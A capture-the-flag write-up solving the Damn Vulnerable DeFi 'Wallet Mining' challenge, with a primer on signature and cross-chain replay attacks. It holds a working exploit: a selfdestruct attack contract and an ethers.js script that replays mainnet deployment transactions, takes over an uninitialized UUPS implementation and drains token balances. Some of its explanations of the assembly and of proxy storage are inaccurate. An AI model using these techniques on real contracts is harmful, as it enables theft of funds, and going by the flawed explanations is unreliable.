<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/13.png">

# Target Contract Review

Given contracts.

**AuthorizerUpgradeable.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

/**
 * @title AuthorizerUpgradeable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AuthorizerUpgradeable is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    mapping(address => mapping(address => uint256)) private wards;

    event Rely(address indexed usr, address aim);

    function init(address[] memory _wards, address[] memory _aims) external initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();

        for (uint256 i = 0; i < _wards.length;) {
            _rely(_wards[i], _aims[i]);
            unchecked {
                i++;
            }
        }
    }

    function _rely(address usr, address aim) private {
        wards[usr][aim] = 1;
        emit Rely(usr, aim);
    }

    function can(address usr, address aim) external view returns (bool) {
        return wards[usr][aim] == 1;
    }

    function upgradeToAndCall(address imp, bytes memory wat) external payable override {
        _authorizeUpgrade(imp);
        _upgradeToAndCallUUPS(imp, wat, true);
    }

    function _authorizeUpgrade(address imp) internal override onlyOwner {}
}
```

This contract is called `AuthorizerUpgradeable` and it is used to manage authorization between different addresses in a decentralized application.

`init()` : This function is used to initialize the contract. It takes two arrays as parameters: `_wards` and `_aims`. Each element in the arrays represents an address pair that will be authorized.

`_rely()` : This function is used to establish an authorization relationship between two addresses.

`can()` : This function is used to check if an address is authorized to interact with another address. It returns true if the authorization exists.

`upgradeToAndCall()` : This function is used to upgrade the contract to a new implementation and call a function on the new implementation. It requires the caller to be the owner of the contract.

`_authorizeUpgrade()` : This function is used to authorize an upgrade to a new implementation. In this contract, it is an empty function, so upgrades are always authorized.

**WalletDeployer.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGnosisSafeProxyFactory {
    function createProxy(address masterCopy, bytes calldata data) external returns (address);
}

/**
 * @title  WalletDeployer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A contract that allows deployers of Gnosis Safe wallets (v1.1.1) to be rewarded.
 *         Includes an optional authorization mechanism to ensure only expected accounts
 *         are rewarded for certain deployments.
 */
contract WalletDeployer {
    // Addresses of the Gnosis Safe Factory and Master Copy v1.1.1
    IGnosisSafeProxyFactory public constant fact = IGnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address public constant copy = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;

    uint256 public constant pay = 1 ether;
    address public immutable chief = msg.sender;
    address public immutable gem;

    address public mom;

    error Boom();

    constructor(address _gem) { gem = _gem; }

    /**
     * @notice Allows the chief to set an authorizer contract.
     * Can only be called once. TODO: double check.
     */
    function rule(address _mom) external {
        if (msg.sender != chief || _mom == address(0) || mom != address(0)) {
            revert Boom();
        }
        mom = _mom;
    }

    /**
     * @notice Allows the caller to deploy a new Safe wallet and receive a payment in return.
     *         If the authorizer is set, the caller must be authorized to execute the deployment.
     * @param wat initialization data to be passed to the Safe wallet
     * @return aim address of the created proxy
     */
    function drop(bytes memory wat) external returns (address aim) {
        aim = fact.createProxy(copy, wat);
        if (mom != address(0) && !can(msg.sender, aim)) {
            revert Boom();
        }
        IERC20(gem).transfer(msg.sender, pay);
    }

    // TODO(0xth3g450pt1m1z0r) put some comments
    function can(address u, address a) public view returns (bool) {
        assembly { 
            let m := sload(0)
            if iszero(extcodesize(m)) {return(0, 0)}
            let p := mload(0x40)
            mstore(0x40,add(p,0x44))
            mstore(p,shl(0xe0,0x4538c4eb))
            mstore(add(p,0x04),u)
            mstore(add(p,0x24),a)
            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
        }
        return true;
    }
}
```

The `WalletDeployer` contract is a contract that allows deployers of Gnosis Safe wallets (v1.1.1) to be rewarded. It includes an optional authorization mechanism to ensure that only expected accounts are rewarded for certain deployments.


`drop()` :  Allows the caller to deploy a new `Gnosis Safe wallet` and receive a payment in return. The function takes an **initialization data parameter (wat)** to be passed to the Safe wallet. If the authorizer is set and the caller is not authorized to execute the deployment, the function will revert.

`can()` : This function is used to check if an account is authorized by the authorizer contract to execute a deployment. Here is a detailed explanation of this function's assembly code:

```assembly
let m := sload(0) ; Loads the value at storage slot 0 and assigns it to m
if iszero(extcodesize(m)) {return(0, 0)} ; Checks if the smart contract at address m
let p := mload(0x40) ; Assigned the value stored at starting point for free memory in the current execution context.
mstore(0x40,add(p,0x44)) ; Updates the memory location 0x40 to point to a new free memory location. It increments the original value at 0x40 by 0x44 bytes, essentially allocating space for data in memory.
mstore(p,shl(0xe0,0x4538c4eb)) ; Stores a calculated value at the memory location pointed to by p. The result of left-shifting is 0xe0
mstore(add(p,0x04),u) ; Stores the address u at the memory location pointed to by p plus 0x04 bytes
mstore(add(p,0x04),a) ; Stores the address a at the memory location pointed to by p plus 0x04 bytes
if iszero(staticcall(gas(), m, p, 0x44, p, 0x20)) {return(0, 0)} ; Makes a static call to m. It checks if the call is successful and returns a non-zero value.
if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)} ; Checks the size of the return data from the static call and ensures that the value stored at memory location p is not zero
```

Challenge's message:

> There’s a contract that incentivizes users to deploy Gnosis Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism. This way it ensures only allowed deployers (a.k.a. wards) are paid for specific deployments. Mind you, some parts of the system have been highly optimized by anon CT gurus.
The deployer contract only works with the official Gnosis Safe factory at `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B` and corresponding master copy at `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F`. Not sure how it’s supposed to work though - those contracts haven’t been deployed to this chain yet.
In the meantime, it seems somebody transferred 20 million DVT tokens to `0x9b6fb606a9f5789444c17768c6dfcf2f83563801`. Which has been assigned to a ward in the authorization contract. Strange, because this address is empty as well.
Pass the challenge by obtaining all tokens held by the wallet deployer contract. Oh, and the 20 million DVT tokens too.

## Signature Replay Attack

A signature replay attack in blockchain involves the fraudulent repetition of a previously approved transaction on the same blockchain or a different one. In this type of attack, the malicious actor intercepts a legitimate transaction and utilizes its signature to circumvent security protocols, enabling them to deceitfully execute the same transaction once more. Let's jump into example of signature replay.

Let us consider a multi-sig wallet with a balance of 20 ETH. The wallet has two administrators, Alice and Eve.

For Eve to withdraw 4 ETH, Alice signs a message that contains his signature. Eve can add his signature and send a transaction to the wallet requesting 4 ETH. This method involves signing a message off-chain. It reduces gas fees.

<p align="center"><img src="https://miro.medium.com/v2/resize:fit:1400/1*IhH-L7B7u7rz6PnIHgQlDw.png"></p>


There are three ways in which Eve can perform the replay attack in these scenarios:

1. Because Alice’s message was signed off-chain and sent to Eve, Eve can decide to withdraw another 4 ETH without the knowledge of Alice. Eve can do this because he already has the signature of Alice. The contract will recognize the signature and approve the transaction.
2. If the contract prevents the above scheme from working, Eve can decide to deploy the contract at another address. Doing this will allow him to perform the same transaction without any hurdles.
3. Eve can deploy the contract by using `CREATE2` and calling `selfdestruct()`. If this is done, the contract can be recreated at the same address and reused with all the previous messages.

<p align="center"><img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/d850578f-6076-4b78-99cf-c316fd032565"></p>

Here is an example vulnerable contract against replay attack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";

contract MultiSigWallet {
    using ECDSA for bytes32;

    address[2] public admins;

    constructor(address[2] memory _admins) payable {
        admins = _admins;
    }

    function deposit() external payable {}

    function transfer(address _sendto, uint _amount, bytes[2] memory _sigs) external {
        bytes32 txHash = getTxHash(_sendto, _amount);
        require(_checkSignature(_sigs, txHash), "invalid sig");

        (bool sent, ) = _sendto.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getTxHash(address _sendto, uint _amount) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(_sendto, _amount));
    }

    function _checkSignature( bytes[2] memory _sigs, bytes32 _txHash) private view returns (bool) {

        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();

        for (uint i = 0; i < _sigs.length; i++) {
            address signer = ethSignedHash.recover(_sigs[i]);
            bool valid = signer == admins[i];

            if (!valid) {
                return false;
            }
        }

        return true;
    }
}
```

As you understand from the contract, there is nothing replay attack check. It just verifies the signature of `_sendto`. Attackers can potentially exploit the contract by sending the victim's signature.


In order to thwart potential attackers from reusing off-chain signatures, it is imperative that we introduce a mechanism to ensure the uniqueness of each signed transaction. **This can be achieved by generating a distinct transaction hash for every transaction, and one effective way to accomplish this is by incorporating a **nonce** into the transaction hash**.

Once a transaction is successfully executed, it becomes essential to invalidate the corresponding hash to prevent any future reuse. This multi-step approach guarantees the security and integrity of our transactions by ensuring that each signature is uniquely tied to its specific transaction, deterring malicious attempts to replay previous signatures. Now, let's delve into the secure code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";

contract MultiSigWallet {
using ECDSA for bytes32;

address[2] public admins;
mapping(bytes32 => bool) public is_executed;

constructor(address[2] memory _admins) payable {
    admins = _admins;
}

function deposit() external payable {}

function transfer(address _sendto, uint _amount, uint _nonce, bytes[2] memory _sigs) external {
    bytes32 txHash = getTxHash(_sendto, _amount, _nonce);

    require(!is_executed[txHash], "transaction has been previously executed");

    require(_checkSignature(_sigs, txHash), "invalid sig");

    is_executed[txHash] = true;

    (bool sent, ) = _sendto.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}

function getTxHash(address _sendto, uint _amount, uint _nonce) public pure returns (bytes32) {
    return keccak256(abi.encodePacked(_sendto, _amount, _nonce));
}

function _checkSignature( bytes[2] memory _sigs, bytes32 _txHash) private view returns (bool) {

    bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();

    for (uint i = 0; i < _sigs.length; i++) {
        address signer = ethSignedHash.recover(_sigs[i]);
        bool valid = signer == admins[i];

        if (!valid) {
            return false;
        }
    }

    return true;
}
    }
```

In the provided code, we've made a significant enhancement by introducing a `_nonce` parameter to both the `getTxHash()` function and the `transfer()` function. This strategic addition has effectively ensured the uniqueness of each signature and hash generated within our system.

Another thing to note is the mapping called `is_executed` which is at the top of the contract. We use this to invalidate each hash after a transaction has been carried out. To do this, we first check if is_executed is false. If it is and the signatures are valid, we set is_executed to true, then send the required ether.

With the preventive measures taken, we can protect our contract from a replay attack that uses the signature of the admins.

```solidity
function transfer(address _sendto, uint _amount, uint _nonce, bytes[2] memory _sigs) external {
    bytes32 txHash = getTxHash(_sendto, _amount, _nonce);

                            // check if is_executed is still false
    require(!is_executed[txHash], "transaction has been previously executed");
                            // check for valid signatures
    require(_checkSignature(_sigs, txHash), "invalid sig");
                                    // change is_executed to true
    is_executed[txHash] = true;

                            // send ether
    (bool sent, ) = _sendto.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```

To fortify our contract against replay attacks that involve deploying the contract at an alternative address, a robust strategy entails incorporating the contract's address directly into the `getTxHash()` function. 

In this manner, when administrators sign the `txHash`, they are effectively signing a hash that is intrinsically tied to the specific contract instance. This approach ensures that every signature is unique to the contract's address, making it highly resistant to replay attacks even if the contract is redeployed at a different location.

```solidity
function getTxHash(address _sendto, uint _amount, uint _nonce) public view returns (bytes32) {
    return keccak256(abi.encodePacked(address(this), _sendto, _amount, _nonce));
}
```


If you want to learn more and see example contracts, you can check [this address](https://solidity-by-example.org/hacks/signature-replay/). 


## Preventing Signature Replay

To safeguard against replay attacks within our contracts, it is imperative to introduce a `nonce`, such as nonce 3, to imbue each off-chain signature with uniqueness. By doing so, once a signature is employed, it becomes impossible for malicious actors to reutilize it since the contract will discern the nonce's prior usage.

In the event that the contract is instantiated at an alternative address, we can thwart replay attacks by incorporating the contract's address into the signature. Additionally, the inclusion of a nonce effectively precludes the first case.

However, in scenarios where a contract is generated through `CREATE2` and subsequently obliterated via selfdestruct(), there exists no feasible method to forestall replay attacks. This is because `selfdestruct()` resets the nonces, rendering the contract oblivious to previously utilized nonces.


## Cross Chain Replay Attacks


Cross-chain replay attacks are a type of security vulnerability that can **occur when multiple blockchain networks share a similar or identical transaction format and cryptographic signatures**. These attacks can have financial and operational consequences for users and network participants. 

### Blockchain Networks and Replay Attacks

Blockchain networks, like Bitcoin and Ethereum, use cryptographic signatures to verify and authorize transactions. These signatures ensure that a transaction is valid and has been authorized by the sender.

### Cross-Chain Transactions

Some cryptocurrencies or blockchain networks may have similar transaction structures, such as Bitcoin and Bitcoin Cash, or Ethereum and Ethereum Classic.
Users sometimes interact with these similar networks, transferring assets or tokens between them. For instance, someone might want to move Bitcoin from the Bitcoin network to Bitcoin Cash.

### 


## Preventing Cross-Chain Replay Attacks

- **Replay Protection:** Developers of new blockchain networks can include replay protection mechanisms in the protocol to prevent replay attacks. This typically involves **adding unique identifiers to transactions or changing the transaction format**.
- **Transaction Prefixing:** Users can manually prefix their transactions with specific data or conditions that make them invalid on the other chain.
- **Use Separate Addresses:** Maintaining separate addresses for each chain can also reduce the risk of replay attacks.




## Uninitialized UUPS Implementation

The `Initializable` contract is a utility contract provided by the OpenZeppelin library that **helps in initializing contract state variables**. It is often used in upgradeable contracts where the state variables need to be initialized during the deployment of a new version of the contract.

One of the key benefits of using proxy contracts is that the storage data (state variables) is **preserved across upgrades**. **When you upgrade the implementation contract, the proxy contract still holds the same storage data. This is because the storage data is tied to the address of the proxy contract, which remains unchanged**.

In this challenge, the `WalletDeployer` contract comes across the `AuthorizerUpgradeable` contract with the UUPS Proxy contract. In the same transaction where you upgrade the implementation contract, you also call a specific function on the new implementation. This function is often referred to as `upgradeAndCall()` because it combines the upgrade and the execution of a specific action.

<p align="center"><img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/2c872350-aed7-4fd7-8d17-4d96ca25e082"></p>

This kind of implementation may be vulnerable because we can call the upgradeAndCall() function without any onlyOwner modifier's revert after creating an initialized attack proxy.

# Subverting

To pass the challenge:

- Factory account must have code
- Master copy account must have code
- Deposit account must have code
- The deposit address and the Safe Deployer contract must not hold tokens
- Player must own all tokens

When we see the master copy contract in the etherscan, we find the version of this contract. Its version **v1.1.1**. [Creation tx](https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3).

<p align="center"><img width="600" src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/b9f6a278-6c96-448e-a76f-16ad83044b1c"></p>

We can get raw transaction hex from [etherscan](https://etherscan.io/getRawTx?tx=0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3) this creation. In this case, we can **replay safe deploy transaction in the mainnet with this raw hex**!

Same process for the safe factory's creation. You can get this transaction raw hex form from [here](https://etherscan.io/getRawTx?tx=0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261). Also, get the [deployer address](https://etherscan.io/address/0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A) of this contract. All these data pass to a [JSON file](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/Challenges/Wallet%20Mining/data.json).


When we analyze v1.1.1 version GnosisSafe contract, there is two helpful function for us. 

```solidity
/// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.
    ///      Note: The fees are always transfered, even if the user transaction fails.
    /// @param to Destination address of Safe transaction.
    /// @param value Ether value of Safe transaction.
    /// @param data Data payload of Safe transaction.
    /// @param operation Operation type of Safe transaction.
    /// @param safeTxGas Gas that should be used for the Safe transaction.
    /// @param baseGas Gas costs for that are indipendent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund)
    /// @param gasPrice Gas price that should be used for the payment calculation.
    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes calldata signatures
    )
        external
        returns (bool success)
    {
        bytes32 txHash;
        // Use scope here to limit variable lifetime and prevent `stack too deep` errors
        {
            bytes memory txHashData = encodeTransactionData(
                to, value, data, operation, // Transaction info
                safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, // Payment info
                nonce
            );
            // Increase nonce and execute transaction.
            nonce++;
            txHash = keccak256(txHashData);
            checkSignatures(txHash, txHashData, signatures, true);
        }
        require(gasleft() >= safeTxGas, "Not enough gas to execute safe transaction");
        // Use scope here to limit variable lifetime and prevent `stack too deep` errors
        {
            uint256 gasUsed = gasleft();
            // If no safeTxGas has been set and the gasPrice is 0 we assume that all available gas can be used
            success = execute(to, value, data, operation, safeTxGas == 0 && gasPrice == 0 ? gasleft() : safeTxGas);
            gasUsed = gasUsed.sub(gasleft());
            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls
            uint256 payment = 0;
            if (gasPrice > 0) {
                payment = handlePayment(gasUsed, baseGas, gasPrice, gasToken, refundReceiver);
            }
            if (success) emit ExecutionSuccess(txHash, payment);
            else emit ExecutionFailure(txHash, payment);
        }
    }
```

With `execTransaction()`, we can execute commands. Sure, we will **execute the code which transfers all tokens to our address**. :)

```solidity
/// @dev Returns hash to be signed by owners.
    /// @param to Destination address.
    /// @param value Ether value.
    /// @param data Data payload.
    /// @param operation Operation type.
    /// @param safeTxGas Fas that should be used for the safe transaction.
    /// @param baseGas Gas costs for data used to trigger the safe transaction.
    /// @param gasPrice Maximum gas price that should be used for this transaction.
    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
    /// @param _nonce Transaction nonce.
    /// @return Transaction hash.
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    )
        public
        view
        returns (bytes32)
    {
        return keccak256(encodeTransactionData(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce));
    }
```

We can use the `getTransactionHash()` function to get transaction hash from we will generated the contract. Let's move on to attack contract:


```solidity
pragma solidity ^0.8.0;

contract AttackWalletMining{

    function attack() external payable{
        selfdestruct(payable(address(0)));
    }

    function proxiableUUID() external view returns(bytes32){
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function can(address u, address a) public view returns (bool) {
        assembly { 
            let m := sload(0)
            if iszero(extcodesize(m)) {return(0, 0)}
            let p := mload(0x40)
            mstore(0x40,add(p,0x44))
            mstore(p,shl(0xe0,0x4538c4eb))
            mstore(add(p,0x04),u)
            mstore(add(p,0x24),a)
            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}
            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
        }
        return true;
    }
}
```

We have `proxiableUUID()` function returns implementaion slot's value to `IERC1822ProxiableUpgradeable(newImplementation).proxiableUUID()` request for pass the requirement from the `_upgradeToAndCallUUPS()`.

```solidity
bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```

```solidity
function _upgradeToAndCallUUPS(
        address newImplementation,
        bytes memory data,
        bool forceCall
    ) internal {
        // Upgrades from old implementations will perform a rollback test. This test requires the new
        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing
        // this special case will break upgrade paths from old UUPS implementation to new ones.
        if (StorageSlotUpgradeable.getBooleanSlot(_ROLLBACK_SLOT).value) {
            _setImplementation(newImplementation);
        } else {
            try IERC1822ProxiableUpgradeable(newImplementation).proxiableUUID() returns (bytes32 slot) {
                require(slot == _IMPLEMENTATION_SLOT, "ERC1967Upgrade: unsupported proxiableUUID");
            } catch {
                revert("ERC1967Upgrade: new implementation is not UUPS");
            }
            _upgradeToAndCall(newImplementation, data, forceCall);
        }
    }
```

To drop all balance, we must be authorized. In this challenge, the authorize mechanism is controlling by `UUPSUpgradeable` contract. We mentioned upgreable proxy contract process. In the Ethereum smart contracts are immutable.**So, you can't change any storage slots, there is only way to change walletdeployer's storage to selfdestruct them**. And when we can call the `upgradeToAndCall()` function, it will delegatecall `attack()` attacking contract. Then, it will execute `selfdestruct()` the contract. Thus, we can get the claimship and transfer all tokens. 


<p align="center"><img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/f1d4e6d8-f0ef-4698-94fe-a0771d7b3dca"></p>


Finally, we have a `can()` function written in the inline assembly that will help us with gas optimization. Here are the attacker commands:

```js
const data = require("./data.json");
const attackAuthorizer = authorizer.connect(player);

// Transfer funds to deploying address
const tx = {
    to: data.REPLAY_DEPLOY_ADDRESS,
    value: ethers.utils.parseEther("1")
}
await player.sendTransaction(tx);

// Replay safe deploy transaction with same data from mainnet
// Tx -> 0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
//  Nonce 0
const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();
const safeContractAddr = deploySafeTx.contractAddress;

// Do same thing again with nonce 1
const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();

// Replay factory deploy transaction with same data from mainnet
// Tx -> 0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
// Nonce 2
const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();
const factoryContractAddr = deployFactoryTx.contractAddress;
const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);

// Helper function to create ABIs
const createInterface = (signature, methodName, arguments) => {
    const ABI = signature;
    const IFace = new ethers.utils.Interface(ABI);
    const ABIData = IFace.encodeFunctionData(methodName, arguments);
    return ABIData;
}

const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
"function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",
"function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];
const setupDummyABIData = createInterface(safeABI, "setup",  [
    [player.address],
    1,
    ethers.constants.AddressZero,
    0,
    ethers.constants.AddressZero,
    ethers.constants.AddressZero,
    0,
    ethers.constants.AddressZero,
])

// Find how many addresses required to find the missing address of
// 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
let nonceRequired = 0
let address = ""
while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {
    address = ethers.utils.getContractAddress({
from: factoryContractAddr,
nonce: nonceRequired
    });
    nonceRequired += 1;
}

for (let i = 0; i < nonceRequired ; i ++) {
    await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);
}

// Create transfer interface for execTransaction
const tokenABI = ["function transfer(address to, uint256 amount)"];
const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);

// Create an execTransaction that transfers all tokens back to the player

// 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
// 2. sign transaction hash
// 3. Add 4 to v as per gnosis spec to show it is an eth_sign tx https://docs.gnosis-safe.io/learn/safe-tools/signatures
// 3. Send it through exec transaction

const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);

// Test that we are connected
// Params for the execTransaction
const transactionParams = [
    token.address,
    0,
    tokenABIData,
    0,
    0,
    0,
    0,
    ethers.constants.AddressZero,
    ethers.constants.AddressZero,
    0
];

// Get tx hash from generated from the contract
const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
const signed = await player.signMessage(ethers.utils.arrayify(txhash));

// Increase v by 4
const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();

// Remove nonce from params and pass in params as well as signed hash
await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);


// Get the implementation address and initialise it
const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
let implementationAddress = "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40);
const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);
const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);
const attackContract = await attackContractFactory.deploy();
const attackABI = ["function attack()"];
const IAttack = createInterface(attackABI, "attack", []);

// Init implementation contract to claim ownership of the contract
// Upgrade to and call attacking contract, calling selfdestruct
await impContract.init([], []);
await impContract.upgradeToAndCall(attackContract.address, IAttack);

// Deploy 43 Wallets through wallet deployer to retrieve all tokens in the contract
for (let i = 0; i < 43; i ++) {
    await (await walletDeployer.connect(player).drop(setupDummyABIData)).wait();
}

```

Solve the challenge.

```powershell

  [Challenge] Wallet mining
    ✔ Execution (1960ms)


  1 passing (4s)

Done in 5.61s.
```

**_by wasny0ps_**
